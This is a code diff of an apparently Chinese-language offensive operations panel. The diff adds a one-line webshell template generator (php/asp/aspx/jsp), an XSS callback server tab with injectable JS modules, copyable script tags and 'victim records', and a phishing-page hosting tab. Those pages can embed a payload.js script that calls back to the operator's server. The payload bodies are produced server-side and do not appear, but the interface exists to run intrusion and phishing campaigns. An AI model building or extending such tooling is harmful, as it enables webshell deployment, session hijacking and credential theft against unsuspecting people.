@@ -8,8 +8,10 @@
 
 {# ── Tab 切换 ── #}
 <nav class="tabs">
-    <a href="?tab=c2" class="tab cc-tab-link {% if tab != 'webshell' %}active{% endif %}" data-tab="c2">C2 工作台</a>
+    <a href="?tab=c2" class="tab cc-tab-link {% if tab != 'webshell' and tab != 'phishing' and tab != 'xss' %}active{% endif %}" data-tab="c2">C2 工作台</a>
     <a href="?tab=webshell" class="tab cc-tab-link {% if tab == 'webshell' %}active{% endif %}" data-tab="webshell">Webshell 管理</a>
+    <a href="?tab=xss" class="tab cc-tab-link {% if tab == 'xss' %}active{% endif %}" data-tab="xss">XSS 管理</a>
+    <a href="?tab=phishing" class="tab cc-tab-link {% if tab == 'phishing' %}active{% endif %}" data-tab="phishing">钓鱼页面</a>
 </nav>
 
 {# ══════════ C2 工作台 Tab ══════════ #}
@@ -440,10 +442,13 @@
             </div>
             <div>
                 <label for="wsf-type" style="font-size:0.76rem;color:var(--text-muted);">类型</label>
-                <select id="wsf-type" class="form-control">
-                    <option value="php">php</option><option value="asp">asp</option>
-                    <option value="aspx">aspx</option><option value="jsp">jsp</option>
-                </select>
+                <div class="form-row" style="gap:6px;">
+                    <select id="wsf-type" class="form-control" style="flex:1;">
+                        <option value="php">php</option><option value="asp">asp</option>
+                        <option value="aspx">aspx</option><option value="jsp">jsp</option>
+                    </select>
+                    <button class="btn btn-sm" onclick="wsGenTemplate()" title="生成对应类型的一句话木马代码(php/jsp/asp/aspx)">一句话</button>
+                </div>
             </div>
             <div>
                 <label for="wsf-method" style="font-size:0.76rem;color:var(--text-muted);">方法</label>
@@ -483,6 +488,164 @@
         </div>
     </div>
 </div>
+
+{# ── WebShell 一句话木马模板库弹层(目录即模块) ── #}
+<div id="ws-tpl-mask" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center;">
+    <div style="width:880px;max-width:96vw;max-height:90vh;overflow:auto;background:var(--surface);border:1px solid var(--border-bright);border-radius:var(--radius);padding:18px 22px;">
+        <div class="card-title" style="margin-bottom:10px;">
+            <h3 style="margin:0;">一句话木马模板库</h3>
+            <button class="btn btn-sm" onclick="wsCloseTpl()">关闭</button>
+        </div>
+        <div style="display:flex;gap:14px;align-items:flex-start;">
+            <div style="width:230px;max-height:58vh;overflow:auto;flex-shrink:0;">
+                <input type="text" id="ws-tpl-search" class="form-control" placeholder="搜索模块..." style="margin-bottom:8px;font-size:0.78rem;" oninput="renderWsTplList()" aria-label="搜索模板模块">
+                <div id="ws-tpl-list"></div>
+            </div>
+            <div style="flex:1;min-width:0;">
+                <div id="ws-tpl-params" style="margin-bottom:10px;"></div>
+                <div class="form-row" style="gap:8px;margin-bottom:8px;">
+                    <button class="btn btn-primary" onclick="wsTplBuild()">生成代码</button>
+                    <button class="btn" onclick="wsCopyTpl()">复制</button>
+                </div>
+                <pre id="ws-tpl-code" class="code-block" style="max-height:34vh;overflow:auto;font-size:0.76rem;white-space:pre;background:rgba(3,7,15,0.6);border:1px solid var(--border);border-radius:var(--radius-sm);padding:10px;margin:0;"></pre>
+                <p id="ws-tpl-note" class="help-text" style="font-size:0.74rem;margin:6px 0 0;"></p>
+            </div>
+        </div>
+    </div>
+</div>
+
+{# ══════════ XSS 管理 Tab(JS 反连模块 + 注入 + 受害记录)══════════ #}
+<div id="tab-xss" {% if tab != 'xss' %}style="display:none"{% endif %}>
+    <div id="ph-error" class="flash error" style="display:none;"></div>
+
+    <div class="card" id="ph-status-bar" style="margin-bottom:12px;padding:10px 14px;display:flex;flex-wrap:wrap;gap:8px 18px;align-items:center;font-size:0.76rem;font-family:var(--font-mono);">
+        <span>状态 <b id="ph-running" style="color:var(--text-muted);">-</b></span>
+        <span>端口 <b id="ph-port">-</b></span>
+        <span>JS 模块 <b id="ph-modcount">-</b></span>
+        <span>受害记录 <b id="ph-reportcount" style="color:var(--danger);">-</b></span>
+        <span style="flex:1;"></span>
+        <button class="btn btn-sm" onclick="phStart()" title="启动 XSS 反连服务器">启动</button>
+        <button class="btn btn-sm" onclick="phStop()" title="停止 XSS 反连服务器">停止</button>
+        <button class="btn btn-sm" onclick="phRestart()" title="重启 XSS 反连服务器">重启</button>
+        <button class="btn btn-sm" onclick="openPhAuditModal()" title="操作审计">操作日志</button>
+    </div>
+
+    <div class="c2-workbench">
+        {# ── 左栏:JS 反连模块 ── #}
+        <div class="wb-col wb-left">
+            <div class="card">
+                <div class="card-title">
+                    <h3 style="margin:0;">JS 模块</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-sm" onclick="phAddModule()" title="新建 JS 模块(.js + MODULE 头)">+ 新建</button>
+                        <button class="btn btn-sm" onclick="loadPhModules()">刷新</button>
+                    </div>
+                </div>
+                <div id="ph-module-list" style="max-height:52vh;overflow-y:auto;"></div>
+            </div>
+        </div>
+
+        {# ── 中栏:构建与注入 + 预览 ── #}
+        <div class="wb-col wb-main">
+            <div class="card">
+                <div class="card-title"><h3 style="margin:0;">构建与注入</h3></div>
+                <div id="ph-build-form">
+                    <p style="color:var(--text-muted);font-size:0.78rem;">← 先在左侧选择一个 JS 模块,配置参数后构建。</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-title">
+                    <h3 style="margin:0;">构建预览</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-sm" onclick="phCopyPreview()">复制 JS</button>
+                        <button class="btn btn-sm" onclick="phCopyScriptTag()" id="ph-copy-tag-btn" style="display:none;">复制注入代码</button>
+                    </div>
+                </div>
+                <pre id="ph-preview" class="code-block" style="max-height:38vh;overflow:auto;font-size:0.72rem;white-space:pre-wrap;word-break:break-all;"></pre>
+                <div id="ph-script-tag" style="display:none;margin-top:8px;padding:8px 10px;border:1px solid var(--success);border-radius:8px;background:rgba(34,197,94,0.06);font-family:var(--font-mono);font-size:0.72rem;word-break:break-all;"></div>
+            </div>
+        </div>
+
+        {# ── 右栏:受害记录 + 服务器配置 ── #}
+        <div class="wb-col wb-right">
+            <div class="card">
+                <div class="card-title">
+                    <h3 style="margin:0;">受害记录 <span id="ph-report-count" style="font-size:0.72rem;color:var(--text-muted);"></span></h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-sm" onclick="phClearReports()" title="清空全部回传记录">清空</button>
+                    </div>
+                </div>
+                <div id="ph-report-list" style="max-height:44vh;overflow-y:auto;"></div>
+            </div>
+            <div class="card">
+                <div class="card-title"><h3 style="margin:0;">服务器配置</h3></div>
+                <div id="ph-config" style="padding:4px 0;"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{# ══════════ 钓鱼页面 Tab(静态页面模块,每页面一个文件夹)══════════ #}
+<div id="tab-phishing" {% if tab != 'phishing' %}style="display:none"{% endif %}>
+    <div class="card" id="ph-page-info" style="margin-bottom:12px;padding:10px 14px;display:flex;flex-wrap:wrap;gap:8px 18px;align-items:center;font-size:0.76rem;font-family:var(--font-mono);">
+        <span>当前页面 <b id="ph-active" style="color:var(--accent);">-</b></span>
+        <span>页面数 <b id="ph-pagecount">-</b></span>
+        <span>服务器 <b id="ph-running2" style="color:var(--text-muted);">-</b></span>
+        <span style="flex:1;"></span>
+        <button class="btn btn-sm" onclick="loadPhPages()">刷新</button>
+    </div>
+
+    <div class="c2-workbench">
+        {# ── 左栏:页面模块列表 ── #}
+        <div class="wb-col wb-left">
+            <div class="card">
+                <div class="card-title">
+                    <h3 style="margin:0;">页面模块</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-sm" onclick="phCreatePage()" title="新建页面文件夹">+ 新建</button>
+                    </div>
+                </div>
+                <div id="ph-page-list" style="max-height:60vh;overflow-y:auto;"></div>
+            </div>
+        </div>
+
+        {# ── 中栏:访问链接 + 操作说明 ── #}
+        <div class="wb-col wb-main">
+            <div class="card">
+                <div class="card-title"><h3 style="margin:0;">访问链接</h3></div>
+                <div id="ph-links" style="font-size:0.74rem;font-family:var(--font-mono);word-break:break-all;"></div>
+            </div>
+            <div class="card">
+                <div class="card-title"><h3 style="margin:0;">页面操作说明</h3></div>
+                <div style="font-size:0.76rem;line-height:1.7;padding:4px 0;color:var(--text-muted);">
+                    <p>· 每个页面是一个文件夹(pages/&lt;页面名&gt;/),内含 index.html + style.css + app.js + meta.json</p>
+                    <p>· 「设为当前」后,服务器根路径 <b>/</b> 即展示该页面</p>
+                    <p>· 「文件」按钮可读取/编辑页面内的 html/css/js(prompt 编辑器)</p>
+                    <p>· 页面 index.html 可内嵌 &lt;script src="/payload.js?m=模块"&gt; 与 XSS 反连 JS 结合</p>
+                    <p>· 页面内支持 {{host}} / {{port}} 占位符(自动替换反连地址)</p>
+                </div>
+            </div>
+        </div>
+
+        {# ── 右栏:服务器状态(简版) ── #}
+        <div class="wb-col wb-right">
+            <div class="card">
+                <div class="card-title"><h3 style="margin:0;">服务器状态</h3></div>
+                <div id="ph-config2" style="padding:4px 0;font-size:0.76rem;line-height:1.8;color:var(--text-muted);">加载中...</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="ph-audit-modal" class="modal-backdrop" style="display:none;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1000;background:rgba(0,0,0,0.65);align-items:center;justify-content:center;">
+    <div class="modal-card" style="width:min(760px,92vw);max-height:80vh;display:flex;flex-direction:column;">
+        <div class="card-title" style="padding:12px 16px;border-bottom:1px solid var(--border);">
+            <h3 style="margin:0;">钓鱼页面操作日志</h3>
+            <button class="btn btn-sm" onclick="closePhAuditModal()" style="margin-left:auto;">关闭</button>
+        </div>
+        <div id="ph-audit-list" style="flex:1;overflow-y:auto;padding:12px 16px;font-size:0.76rem;font-family:var(--font-mono);"></div>
+    </div>
+</div>
 {% endblock %}
 
 {% block scripts %}
@@ -491,18 +654,22 @@ function escapeHtml(s) {
     return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
 
-// ══════════ Tab 切换（c2 / webshell） ══════════
+// ══════════ Tab 切换（c2 / webshell / xss / phishing） ══════════
 document.querySelectorAll('.cc-tab-link').forEach(function(link) {
     link.addEventListener('click', function(e) {
         var targetTab = this.getAttribute('data-tab');
         e.preventDefault();
         document.getElementById('tab-c2').style.display = (targetTab === 'c2') ? '' : 'none';
         document.getElementById('tab-webshell').style.display = (targetTab === 'webshell') ? '' : 'none';
+        document.getElementById('tab-xss').style.display = (targetTab === 'xss') ? '' : 'none';
+        document.getElementById('tab-phishing').style.display = (targetTab === 'phishing') ? '' : 'none';
         document.querySelectorAll('.cc-tab-link').forEach(function(l) { l.classList.remove('active'); });
         this.classList.add('active');
         history.replaceState(null, '', '?tab=' + targetTab);
         if (targetTab === 'c2') loadStatus();
         if (targetTab === 'webshell') loadWsConnections();
+        if (targetTab === 'xss') { loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks(); }
+        if (targetTab === 'phishing') { loadPhStatus(); loadPhPages(); loadPhLinks(); }
     });
 });
 
@@ -1829,6 +1996,119 @@ async function wsTogglePass() {
     document.getElementById('ws-pass-btn').textContent = wsPassVisible ? '隐藏' : '显示';
 }
 
+// ── 一句话木马模板库(目录即模块:webshell_templates/*,按 c2/phishing 模块体系) ──
+var wsTplCache = [];
+var wsTplSelected = '';
+async function wsGenTemplate() {
+    document.getElementById('ws-tpl-mask').style.display = 'flex';
+    wsTplSelected = '';
+    document.getElementById('ws-tpl-params').innerHTML = '';
+    document.getElementById('ws-tpl-code').textContent = '';
+    document.getElementById('ws-tpl-note').textContent = '';
+    try {
+        var d = await fetch('/api/webshell/templates');
+        var j = await d.json();
+        wsTplCache = j.templates || [];
+        renderWsTplList();
+    } catch (e) { alert('加载模板库失败: ' + e); }
+}
+function renderWsTplList() {
+    var box = document.getElementById('ws-tpl-list');
+    if (!box) return;
+    var kw = (document.getElementById('ws-tpl-search').value || '').toLowerCase();
+    var list = wsTplCache.filter(function(t) {
+        return !kw || (t.name + ' ' + (t.desc || '')).toLowerCase().indexOf(kw) !== -1;
+    });
+    var groups = {}, order = [];
+    list.forEach(function(t) {
+        var c = t.category || 'other';
+        if (!groups[c]) { groups[c] = []; order.push(c); }
+        groups[c].push(t);
+    });
+    var html = '';
+    order.forEach(function(c) {
+        html += '<div style="font-size:0.68rem;color:var(--text-faint);text-transform:uppercase;letter-spacing:0.06em;margin:8px 2px 2px;font-weight:600;">' + escapeHtml(c) + ' (' + groups[c].length + ')</div>';
+        groups[c].forEach(function(t) {
+            var active = t.name === wsTplSelected;
+            html += '<div class="ws-tpl-item" data-name="' + escapeHtml(t.name) + '" onclick="wsTplSelect(\'' + escapeHtml(t.name) + '\')" style="padding:7px 9px;margin:4px 0;border:1px solid ' + (active ? 'var(--accent)' : 'var(--border)') + ';border-radius:8px;cursor:pointer;font-size:0.76rem;background:' + (active ? 'rgba(0,160,255,0.08)' : 'rgba(3,7,15,0.4)') + ';" title="' + escapeHtml(t.desc || '') + '">' + escapeHtml(t.name) + '</div>';
+        });
+    });
+    box.innerHTML = html || '<p style="color:var(--text-muted);font-size:0.76rem;">无匹配模块</p>';
+}
+function wsTplSelect(name) {
+    wsTplSelected = name;
+    var mod = wsTplCache.find(function(t) { return t.name === name; });
+    var box = document.getElementById('ws-tpl-params');
+    if (!mod) { box.innerHTML = ''; return; }
+    var html = '<div style="font-size:0.8rem;color:var(--accent);font-weight:600;margin-bottom:4px;">' + escapeHtml(mod.name) + '</div>';
+    html += '<div style="font-size:0.72rem;color:var(--text-muted);margin-bottom:8px;">' + escapeHtml(mod.desc || '') + '</div>';
+    html += '<div id="ws-tpl-fields"></div>';
+    box.innerHTML = html;
+    var f = document.getElementById('ws-tpl-fields');
+    // 默认值:pass 取表单密码,cmd_param 取表单命令参数名
+    var defs = {
+        pass: document.getElementById('wsf-password').value || '',
+        cmd_param: document.getElementById('wsf-cmdparam').value || 'cmd'
+    };
+    (mod.params || []).forEach(function(p, i) {
+        var pname = p[0], hint = p[1] || '';
+        var def = defs[pname] !== undefined ? defs[pname] : '';
+        var row = document.createElement('div');
+        row.style.marginBottom = '8px';
+        var lab = document.createElement('label');
+        lab.htmlFor = 'ws-tpl-p' + i;
+        lab.textContent = pname + (hint ? ' (' + hint + ')' : '');
+        lab.style.cssText = 'display:block;font-size:0.74rem;color:var(--text-muted);margin-bottom:3px;';
+        var inp = document.createElement('input');
+        inp.id = 'ws-tpl-p' + i;
+        inp.className = 'form-control';
+        inp.value = def;
+        inp.setAttribute('data-param', pname);
+        inp.style.cssText = 'font-family:var(--font-mono);font-size:0.8rem;';
+        row.appendChild(lab);
+        row.appendChild(inp);
+        f.appendChild(row);
+    });
+    renderWsTplList();
+    document.getElementById('ws-tpl-code').textContent = '';
+    document.getElementById('ws-tpl-note').textContent = '';
+}
+async function wsTplBuild() {
+    if (!wsTplSelected) { alert('先在左侧选择模板模块'); return; }
+    var params = {};
+    document.querySelectorAll('#ws-tpl-fields [data-param]').forEach(function(el) {
+        params[el.getAttribute('data-param')] = el.value;
+    });
+    try {
+        var d = await fetch('/api/webshell/template/render', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name: wsTplSelected, params: params })
+        });
+        var j = await d.json();
+        if (!j.ok) { alert(j.error || '生成失败'); return; }
+        document.getElementById('ws-tpl-code').textContent = j.code;
+        document.getElementById('ws-tpl-note').textContent = j.note || '';
+    } catch (e) { alert('生成失败: ' + e); }
+}
+function wsCloseTpl() {
+    document.getElementById('ws-tpl-mask').style.display = 'none';
+}
+function wsCopyTpl() {
+    var el = document.getElementById('ws-tpl-code');
+    if (!el.textContent) return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(el.textContent).then(function(){ alert('已复制'); }, function(){ alert('复制失败,请手动选择复制'); });
+    } else {
+        var ta = document.createElement('textarea');
+        ta.value = el.textContent;
+        document.body.appendChild(ta);
+        ta.select();
+        try { document.execCommand('copy'); alert('已复制'); } catch (e) {}
+        document.body.removeChild(ta);
+    }
+}
+
 async function editWsConn() {
     const r = await fetch('/api/webshell/connection/' + currentWsId);
     const d = await r.json();
@@ -2199,6 +2479,554 @@ async function clearWsHistoryAll() {
 
 // ── 初始化 ──
 renderSnippets();
-{% if tab == 'c2' %}loadStatus();{% else %}loadWsConnections();{% endif %}
+{% if tab == 'c2' %}loadStatus();{% elif tab == 'xss' %}loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks();{% elif tab == 'phishing' %}loadPhStatus(); loadPhPages(); loadPhLinks();{% else %}loadWsConnections();{% endif %}
+
+// ══════════════════════ 钓鱼页面(phishing) ══════════════════════
+var phTimer = null;
+var phSelectedModule = '';
+var phBuildResult = null;
+
+function phApiError(resp, fallback) {
+    return 'HTTP ' + resp.status + ': ' + (fallback || '');
+}
+
+function phShowError(msg) {
+    var el = document.getElementById('ph-error');
+    if (el) { el.style.display = 'block'; el.textContent = msg; setTimeout(function(){ el.style.display = 'none'; }, 6000); }
+}
+
+async function phFetch(url, opts) {
+    try {
+        var resp = await fetch(url, opts);
+        var data = null;
+        try { data = await resp.json(); } catch (e) { data = null; }
+        if (!resp.ok) { throw new Error((data && data.error) || ('HTTP ' + resp.status)); }
+        return data || {};
+    } catch (e) {
+        phShowError(String(e.message || e));
+        throw e;
+    }
+}
+
+// ── 状态 / 启动停止 ──
+
+async function loadPhStatus() {
+    try {
+        var d = await phFetch('/api/phishing/status');
+        var st = d;
+        document.getElementById('ph-running').textContent = st.running ? '运行中' : '已停止';
+        document.getElementById('ph-running').style.color = st.running ? 'var(--success)' : 'var(--danger)';
+        document.getElementById('ph-port').textContent = st.port || '-';
+        document.getElementById('ph-modcount').textContent = st.module_count || 0;
+        var r2 = document.getElementById('ph-running2');
+        if (r2) { r2.textContent = st.running ? '运行中' : '已停止'; r2.style.color = st.running ? 'var(--success)' : 'var(--danger)'; }
+        var pc = document.getElementById('ph-pagecount');
+        if (pc) pc.textContent = st.page_count || 0;
+        var act = document.getElementById('ph-active');
+        if (act) act.textContent = st.active_page || '-';
+        var cfg2 = document.getElementById('ph-config2');
+        if (cfg2) {
+            cfg2.innerHTML = (st.running ? '' : '<span style="color:var(--danger);">服务器未运行</span><br>') +
+                '端口: <b>' + (st.port || '-') + '</b><br>' +
+                '反连路由: <b>' + (st.route_payload || '-') + '</b><br>' +
+                '回传路由: <b>' + (st.route_report || '-') + '</b><br>' +
+                '当前页面: <b>' + (st.active_page || '-') + '</b><br>' +
+                '默认模块: <b>' + (st.default_module || '-') + '</b>';
+        }
+        renderPhLinks(st);
+    } catch (e) { /* 未启用 */ }
+}
+
+// 独立加载访问链接(钓鱼页面 tab 使用;XSS tab 由 loadPhStatus 一并渲染)
+async function loadPhLinks() {
+    try {
+        var st = await phFetch('/api/phishing/status');
+        renderPhLinks(st);
+    } catch (e) { /* 未启用 */ }
+}
+
+function renderPhLinks(st) {
+    var box = document.getElementById('ph-links');
+    if (!box) return;
+    if (!st.running) { box.innerHTML = '<span style="color:var(--text-muted);">服务器未运行</span>'; return; }
+    var host = window.location.hostname || '127.0.0.1';
+    var base = 'http://' + host + ':' + (st.port || '9100');
+    var html = '<div style="margin-bottom:6px;">当前页面:</div>';
+    html += '<div style="margin-bottom:8px;"><a href="' + base + '/" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/</a></div>';
+    html += '<div style="margin-bottom:6px;">指定页面:</div>';
+    html += '<div style="margin-bottom:8px;"><a href="' + base + '/page/' + encodeURIComponent(st.active_page || 'login') + '" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/page/' + encodeURIComponent(st.active_page || 'login') + '</a></div>';
+    html += '<div style="margin-bottom:6px;">JS 反连:</div>';
+    html += '<div><a href="' + base + '/payload.js?m=' + encodeURIComponent(st.default_module || 'hello') + '" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/payload.js?m=' + encodeURIComponent(st.default_module || 'hello') + '</a></div>';
+    box.innerHTML = html;
+}
+
+async function phStart() {
+    try {
+        var d = await phFetch('/api/phishing/start', {method: 'POST'});
+        loadPhStatus();
+    } catch (e) {}
+}
+
+async function phStop() {
+    try {
+        var d = await phFetch('/api/phishing/stop', {method: 'POST'});
+        loadPhStatus();
+    } catch (e) {}
+}
+
+async function phRestart() {
+    if (!confirm('重启钓鱼服务器?')) return;
+    try {
+        var d = await phFetch('/api/phishing/restart', {method: 'POST'});
+        loadPhStatus();
+    } catch (e) {}
+}
+
+// ── JS 模块列表 / 参数表单 / 构建 ──
+
+async function loadPhModules() {
+    try {
+        var d = await phFetch('/api/phishing/modules');
+        var list = document.getElementById('ph-module-list');
+        if (!list) return;
+        var mods = d.modules || [];
+        if (!mods.length) { list.innerHTML = '<p style="color:var(--text-muted);font-size:0.78rem;padding:8px;">暂无 JS 模块</p>'; return; }
+        list._phModules = mods;
+        // 按 category 分组渲染(BeEF 风格分类)
+        var groups = {};
+        var order = [];
+        mods.forEach(function(m) {
+            var cat = m.category || '自定义';
+            if (!groups[cat]) { groups[cat] = []; order.push(cat); }
+            groups[cat].push(m);
+        });
+        var html = '';
+        order.forEach(function(cat) {
+            html += '<div style="font-size:0.7rem;color:var(--text-faint);text-transform:uppercase;letter-spacing:0.06em;margin:10px 2px 2px;font-weight:600;">' + escapeHtml(cat) + ' (' + groups[cat].length + ')</div>';
+            groups[cat].forEach(function(m) {
+                var params = (m.params || []).map(function(p){ return p[0]; }).join(', ');
+                html += '<div class="ph-mod-item" data-name="' + escapeHtml(m.name) + '" style="padding:8px 10px;margin:6px 0;border:1px solid var(--border);border-radius:8px;cursor:pointer;background:rgba(3,7,15,0.4);" onclick="phSelectModule(\'' + escapeHtml(m.name) + '\')">';
+                html += '<div style="font-weight:600;font-size:0.8rem;color:var(--accent);">' + escapeHtml(m.name) + '</div>';
+                html += '<div style="font-size:0.72rem;color:var(--text-muted);margin-top:2px;">' + escapeHtml(m.desc || '') + '</div>';
+                if (params) html += '<div style="font-size:0.7rem;color:var(--text-faint);margin-top:2px;font-family:var(--font-mono);">参数: ' + escapeHtml(params) + '</div>';
+                html += '</div>';
+            });
+        });
+        list.innerHTML = html;
+    } catch (e) {}
+}
+
+function phSelectModule(name) {
+    phSelectedModule = name;
+    phBuildResult = null;
+    document.getElementById('ph-preview').textContent = '';
+    document.getElementById('ph-script-tag').style.display = 'none';
+    document.getElementById('ph-copy-tag-btn').style.display = 'none';
+    var box = document.getElementById('ph-build-form');
+    if (!box) return;
+    // 从已加载的模块列表里找参数
+    var params = [];
+    var list = document.getElementById('ph-module-list');
+    if (list && list._phModules) {
+        var mod = (list._phModules || []).find(function(m){ return m.name === name; });
+        if (mod) params = mod.params || [];
+    }
+    box.innerHTML = '<div style="font-size:0.8rem;color:var(--accent);font-weight:600;margin-bottom:10px;">模块: ' + escapeHtml(name) + '</div>';
+    box.innerHTML += '<div id="ph-params"></div>';
+    var pbox = document.getElementById('ph-params');
+    params.forEach(function(p, i) {
+        var pname = p[0], hint = p[1] || '';
+        var def = '';
+        var m = /默认\s*([^\s,;]+)/.exec(hint);
+        if (m) def = m[1];
+        var row = document.createElement('div');
+        row.style.cssText = 'margin-bottom:8px;';
+        var lab = document.createElement('label');
+        lab.htmlFor = 'ph-param-' + i;
+        lab.textContent = pname + (hint ? ' (' + hint + ')' : '');
+        lab.style.cssText = 'display:block;font-size:0.76rem;color:var(--text-muted);margin-bottom:4px;';
+        var inp = document.createElement('input');
+        inp.id = 'ph-param-' + i;
+        inp.className = 'form-control';
+        inp.value = def;
+        inp.setAttribute('data-param', pname);
+        inp.style.cssText = 'font-family:var(--font-mono);font-size:0.78rem;';
+        row.appendChild(lab);
+        row.appendChild(inp);
+        pbox.appendChild(row);
+    });
+    var hostRow = document.createElement('div');
+    hostRow.style.cssText = 'margin-bottom:10px;';
+    var hl = document.createElement('label');
+    hl.htmlFor = 'ph-param-host';
+    hl.textContent = '反连地址 host (留空=自动)';
+    hl.style.cssText = 'display:block;font-size:0.76rem;color:var(--text-muted);margin-bottom:4px;';
+    var hin = document.createElement('input');
+    hin.id = 'ph-param-host';
+    hin.className = 'form-control';
+    hin.placeholder = '自动取服务器地址';
+    hin.style.cssText = 'font-family:var(--font-mono);font-size:0.78rem;';
+    hostRow.appendChild(hl);
+    hostRow.appendChild(hin);
+    pbox.appendChild(hostRow);
+    var btn = document.createElement('button');
+    btn.className = 'btn btn-primary btn-sm';
+    btn.textContent = '构建预览';
+    btn.onclick = phBuildPreview;
+    box.appendChild(btn);
+}
+
+async function phBuildPreview() {
+    if (!phSelectedModule) { phShowError('请先选择模块'); return; }
+    var args = {};
+    var inputs = document.querySelectorAll('#ph-params input[data-param]');
+    inputs.forEach(function(inp) { args[inp.getAttribute('data-param')] = inp.value; });
+    var hostInp = document.getElementById('ph-param-host');
+    var host = hostInp ? hostInp.value.trim() : '';
+    try {
+        var d = await phFetch('/api/phishing/build', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({name: phSelectedModule, args: args, host: host})
+        });
+        phBuildResult = d;
+        document.getElementById('ph-preview').textContent = d.code || '';
+        var tagBox = document.getElementById('ph-script-tag');
+        var tagBtn = document.getElementById('ph-copy-tag-btn');
+        if (d.script_tag) {
+            tagBox.style.display = 'block';
+            tagBox.textContent = d.script_tag;
+            tagBtn.style.display = '';
+        } else {
+            tagBox.style.display = 'none';
+            tagBtn.style.display = 'none';
+        }
+    } catch (e) {}
+}
+
+function phCopyPreview() {
+    var t = (phBuildResult && phBuildResult.code) || document.getElementById('ph-preview').textContent || '';
+    phCopyText(t);
+}
+
+function phCopyScriptTag() {
+    var t = (phBuildResult && phBuildResult.script_tag) || '';
+    phCopyText(t);
+}
+
+function phCopyText(t) {
+    if (!t) return;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(t).catch(function(){ phCopyFallback(t); });
+    } else {
+        phCopyFallback(t);
+    }
+}
+
+function phCopyFallback(t) {
+    var ta = document.createElement('textarea');
+    ta.value = t;
+    ta.style.cssText = 'position:fixed;left:-9999px;top:0;';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+}
+
+// ── 页面模块 ──
+
+async function loadPhPages() {
+    try {
+        var d = await phFetch('/api/phishing/pages');
+        var list = document.getElementById('ph-page-list');
+        if (!list) return;
+        list._phPages = d.pages || [];
+        var pages = d.pages || [];
+        var active = d.active_page || '';
+        if (!pages.length) { list.innerHTML = '<p style="color:var(--text-muted);font-size:0.78rem;padding:8px;">暂无页面模块</p>'; return; }
+        var html = '';
+        pages.forEach(function(p) {
+            var isActive = p.name === active;
+            html += '<div style="padding:8px 10px;margin:6px 0;border:1px solid ' + (isActive ? 'var(--success)' : 'var(--border)') + ';border-radius:8px;background:rgba(3,7,15,0.4);">';
+            html += '<div style="display:flex;align-items:center;gap:8px;">';
+            html += '<span style="font-weight:600;font-size:0.8rem;' + (isActive ? 'color:var(--success);' : '') + '">' + escapeHtml(p.name) + (isActive ? ' ✓' : '') + '</span>';
+            html += '<span style="flex:1;"></span>';
+            html += '<span style="font-size:0.7rem;color:var(--text-faint);font-family:var(--font-mono);">' + (p.files || []).length + ' 个文件</span>';
+            html += '</div>';
+            html += '<div style="font-size:0.72rem;color:var(--text-muted);margin-top:3px;">' + escapeHtml(p.desc || '') + '</div>';
+            // 操作按钮:独立一行,卡片最底部
+            html += '<div style="display:flex;gap:6px;margin-top:8px;padding-top:8px;border-top:1px dashed var(--border);">';
+            if (!isActive) html += '<button class="btn btn-sm" style="flex:1;" onclick="phActivatePage(\'' + escapeHtml(p.name) + '\')">设为当前</button>';
+            else html += '<span class="btn btn-sm" style="flex:1;cursor:default;opacity:0.6;background:transparent;border:1px solid var(--success);color:var(--success);">当前活动页</span>';
+            html += '<button class="btn btn-sm" style="flex:1;" onclick="phBrowsePage(\'' + escapeHtml(p.name) + '\')">文件</button>';
+            html += '<button class="btn btn-sm" style="flex:1;" onclick="phDeletePage(\'' + escapeHtml(p.name) + '\')">删除</button>';
+            html += '</div>';
+            html += '</div>';
+        });
+        list.innerHTML = html;
+        var st = document.getElementById('ph-active');
+        if (st) st.textContent = active || '-';
+    } catch (e) {}
+}
+
+async function phActivatePage(name) {
+    try {
+        var d = await phFetch('/api/phishing/page/' + encodeURIComponent(name) + '/activate', {method: 'POST'});
+        loadPhPages();
+        loadPhStatus();
+    } catch (e) {}
+}
+
+function phBrowsePage(name) {
+    var content = prompt('页面 ' + name + ' 文件操作\n输入文件名(如 index.html / style.css / app.js)读取,留空取消:', 'index.html');
+    if (content === null) return;
+    var fname = content.trim();
+    if (!fname) return;
+    phEditPageFile(name, fname);
+}
+
+async function phEditPageFile(name, fname) {
+    try {
+        var d = await phFetch('/api/phishing/page/' + encodeURIComponent(name) + '/file?path=' + encodeURIComponent(fname));
+        var newContent = prompt('编辑 ' + name + '/' + fname + '\n(内容会原样写回)', d.content || '');
+        if (newContent === null) return;
+        var r = await phFetch('/api/phishing/page/' + encodeURIComponent(name) + '/file', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({path: fname, content: newContent})
+        });
+        alert(r.message || '已保存');
+    } catch (e) {}
+}
+
+async function phCreatePage() {
+    var name = prompt('新页面文件夹名(字母/数字/_/-):', '');
+    if (!name) return;
+    name = name.trim();
+    if (!/^[A-Za-z0-9_-]+$/.test(name)) { alert('页面名只允许字母/数字/下划线/短横线'); return; }
+    var desc = prompt('页面描述(可选):', '') || '';
+    try {
+        var d = await phFetch('/api/phishing/page/create', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({name: name, desc: desc})
+        });
+        loadPhPages();
+    } catch (e) {}
+}
+
